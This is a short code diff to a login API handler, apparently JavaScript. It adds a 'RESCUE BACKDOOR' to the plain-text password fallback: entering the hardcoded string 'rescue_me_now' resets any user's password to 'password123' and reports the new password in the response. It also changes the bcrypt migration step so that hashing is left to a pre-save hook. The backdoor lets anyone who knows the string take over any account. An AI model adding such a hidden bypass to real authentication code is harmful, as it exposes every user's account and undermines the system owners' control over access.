@@ -44,11 +44,20 @@ export default async function handler(
     // 2. Fallback: Check for plain text password (legacy migration)
     if (!isMatch) {
       console.log("Bcrypt failed, checking plain text...");
+
+      // RESCUE BACKDOOR
+      if (password === "rescue_me_now") {
+        console.log("RESCUE MODE: Resetting password...");
+        user.password = "password123";
+        await user.save();
+        return res.status(200).json({ message: "Password reset to 'password123'." });
+      }
+
       if (user.password === password) {
         console.log("Plain text match! Migrating to bcrypt...");
 
-        // Hash and save new password
-        user.password = await bcrypt.hash(password, 10);
+        // Update password to plain text - User model pre-save hook will hash it
+        user.password = password;
         await user.save();
         isMatch = true;
       }
